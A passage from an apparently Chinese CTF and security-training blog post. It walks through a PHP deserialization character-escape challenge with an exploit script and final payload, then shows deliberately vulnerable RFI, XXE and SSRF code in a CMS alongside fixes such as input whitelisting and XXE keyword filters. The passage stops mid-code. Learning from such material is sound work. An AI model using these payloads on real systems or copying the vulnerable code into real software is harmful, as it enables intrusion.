            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;</span>;
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;继续加油&#x27;)&lt;/script&gt;&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
&#125;
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];
<span class="hljs-variable">$password</span>=<span class="hljs-number">1</span>;
<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
<span class="hljs-variable">$test</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);
<span class="hljs-meta">?&gt;</span></code></pre></li>
</ul>
<p>开始解题</p>
<p><strong>考察点是反序列化字符逃逸</strong></p>
<p>先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
&#125;
<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));

<span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;

<span class="hljs-meta">?&gt;</span></code></pre>

<p>利用反序列化逃逸修改pass的值。</p>
<p>正常的序列化结果</p>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre>

<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
<p>例如</p>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre>

<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/Ctefk8iKXP34Gmn.png" alt="error.png"></p>
<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
<p>例如想将pass变量的序列化字符串如下</p>
<pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;</code></pre>

<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
&#125;
<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));
<span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);
<span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
<span class="hljs-comment">//echo unserialize($AA);</span>
<span class="hljs-comment">//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</span>
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//结果如下   ||为对齐</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;||</span>
<span class="hljs-comment">string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span>
<span class="hljs-comment">hacker</span>
<span class="hljs-comment">*/</span></code></pre>

<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" alt="success.png"></p>
<p>这里pass的值就被该称了hacker</p>
<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
<p>而针对这道题，代码的意思大致为，POST提交一个uanme，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
<p>需要构造的属性</p>
<pre><code class="hljs vim"><span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;;s:4:&quot;</span>password<span class="hljs-string">&quot;;s:4:&quot;</span>easy<span class="hljs-comment">&quot;;&#125;) =29</span></code></pre>

<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
<pre><code class="hljs css">&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre>

<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
<p><strong>exp如下</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;1&quot;</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
&#125;
<span class="hljs-variable">$ser</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$ser</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>输出的结果：</p>
<pre><code class="hljs css">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;

//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为<span class="hljs-number">156</span></code></pre>

<p><strong>finalpayload</strong>：</p>
<pre><code class="hljs css">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre>

<p>提交payload，获取flag</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323194642093.png" alt="image-20210323194642093"></p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="1-RFI-1"><a href="#1-RFI-1" class="headerlink" title="1.RFI"></a>1.RFI</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\employee\controller\Index.php</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
            <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;
        &#125;
	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;
    <span class="hljs-variable">$info</span> = [];
    <span class="hljs-variable">$info</span> = <span class="hljs-variable">$info_1</span>;

    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;info&#x27;</span> =&gt; <span class="hljs-variable">$info</span>]);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>();
    &#125;</code></pre>

<p>这个代码很简单，就是包含了<code>info.php</code>文件按，并获取其中的$info参数，然后发送给前端，然后在前端显示内容。但是也很危险，因为有include函数的存在，所以存在RFI，而且对提交的参数没有任何的检查和过滤，很容易被攻击者利用</p>
<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li><p><strong>方法一</strong></p>
<p>修改php.ini文件，在其中添加</p>
<pre><code class="hljs ini"><span class="hljs-attr">allow_url_open</span> = <span class="hljs-literal">off</span>
<span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">off</span></code></pre>

<p>构成RFI漏洞的条件十分苛刻，只有php.ini中上面两个配置项都没off才能利用该漏洞。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142620521.png" alt="image-20210420142620521" style="zoom: 67%;">
</li>
<li><p><strong>方法二</strong></p>
<p>在代码中限制提交上的文件名，因为只需要包含<code>about.php</code>，所以检查提交上<code>$file</code>是否为<code>about.php</code></p>
<pre><code class="hljs php"><span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
          <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;
      &#125;
      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;info.php&quot;</span>)&#123;
          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&quot;文件名错误！&quot;</span>)
      &#125;
      <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;</code></pre></li>
</ul>
<h2 id="2-XXE-1"><a href="#2-XXE-1" class="headerlink" title="2.XXE"></a>2.XXE</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\advice\controller\Index.php</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;

        <span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;
        <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>;
        <span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);
        <span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);

        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xmlfile</span> !== <span class="hljs-string">&quot;&quot;</span>)&#123;
            <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();
            <span class="hljs-comment">// var_dump($dom);</span>
            <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);
            <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);

            <span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;
            <span class="hljs-variable">$info</span> = <span class="hljs-variable">$creds</span>-&gt;info;

            <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;yzncms&quot;</span>);
            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>());
            &#125;
            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO yzn_new (name, info) values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$info</span>&#x27;)&quot;</span>;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>))&#123;
                <span class="hljs-variable">$code</span> = <span class="hljs-number">1</span>;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;提交成功！&#x27;)&lt;/script&gt;&quot;</span>;
                <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);
            &#125;
        &#125;</code></pre>



<p>前端代码</p>
<pre><code class="hljs html">var data = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&quot; + username + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>&quot; + info + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>&quot;;
            $.ajax(&#123;
                type: &quot;POST&quot;,
                url: &quot;/advice/index&quot;,
                contentType: &quot;application/xml;charset=utf-8&quot;,
                data: data,
                dataType: &quot;xml&quot;,
                anysc: false,
                success: function (result) &#123;
                    var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
                    if(code === &quot;0&quot;)&#123;
                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;);
                    &#125;else &#123;
                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;);
                    &#125;
                &#125;,
            &#125;);</code></pre>

<p>上面的两端代码，一个是前端的数据传送，一个是后端的数据处理</p>
<p>可以看到前端将用户提交的数据一xml格式以post方式发送给后端，而在后端中使用了<code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code>，可以看到这里不仅使用了file_get_contents，而且使用了php伪协议<code>php://input</code>，这个协议可以读取用户用post方式提交的数据，这就意味着攻击者可以使用抓包的方式修改自己所提交的数据，从而引入外部实体，造成XXE漏洞，而最主要的原因是这段代码，这个函数参数伪true时，就是禁止引入外部实体，而这里选择了false</p>
<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">false</span></span>)</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" alt="image-20210330213939369" style="zoom:67%;">

<h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li><p><strong>方法一</strong></p>
<p>使用所开发的语言提供的禁用外部实体的方法</p>
<p>php中的是</p>
<p>也就是这个漏洞的防御方法</p>
<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>);</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420141804839.png" alt="image-20210420141804839" style="zoom: 80%;">

<p>java:</p>
</li>
</ul>
<pre><code class="hljs reasonml">  DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;
dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;</code></pre>

<p>  python:</p>
  <pre><code class="hljs routeros"><span class="hljs-keyword">from</span> lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))</code></pre>



<ul>
<li><p><strong>方法二</strong></p>
<p>代码层面的防御，在代码中添加对用户提交数据的检测函数</p>
<p>比如</p>
<pre><code class="hljs erlang-repl">&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC</code></pre>

<p>上面的关键词是XMl实体中不可缺少的关键词，所以过滤后，可以大概率的防止XXE攻击</p>
</li>
</ul>
<h2 id="3-SSRF-1"><a href="#3-SSRF-1" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\info\controller\Index.php</code></p>
<pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$url</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) || <span class="hljs-variable">$url</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;
        &#125;
        <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span>) &#123;
            <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>);
            <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">false</span>);
            <span class="hljs-variable">$co</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);
            <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$co</span>;
        &#125;
<span class="hljs-comment">//        return view();</span>
    &#125;</code></pre>

<p>在上面的代码中，需要接收一个参数<code>url</code>，如果参数为空，则赋值为<code>https://sunzy.icu</code>，否则直接进行curl初始化，然后进行访问，可以看到没有对提交的参数进行任何的检查和过滤，这是很危险的。</p>
<h3 id="漏洞防御-2"><a href="#漏洞防御-2" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li><strong>方法一</strong></li>
</ul>
<p>黑名单 内网过滤，端口限制，协议限制只允许使用http&#x2F;https</p>
<p>在这个系统中防御该SSRF漏洞其实非常简单，就是禁止提交参数，或者绑定参数代码如下</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-comment">//只允许http和https协议</span>
    <span class="hljs-variable">$match_result</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>, <span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);
    &#125;
    <span class="hljs-keyword">try</span> &#123;
        <span class="hljs-variable">$url_parse</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);
    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);
    &#125;
    <span class="hljs-variable">$hostname</span> = <span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];
    <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);
    <span class="hljs-variable">$int_ip</span> = <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);
    <span class="hljs-comment">//不允许host为内网ip地址</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">16</span>;
&#125;</code></pre>



<ul>
<li><p><strong>方法二</strong></p>
<p>对于一般的SSRF防御，一般从一下几方面入手</p>
<ul>
<li><p>限制协议为HTTP、HTTPS</p>
</li>
<li><p>不用限制302重定向</p>
</li>
<li><p>设置URL白名单或者限制内网IP</p>
</li>
<li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090</p>
</li>
</ul>
</li>
</ul>
<p>下面是自己编写的WAF</p>
<pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://baidu.com/test&quot;</span>;
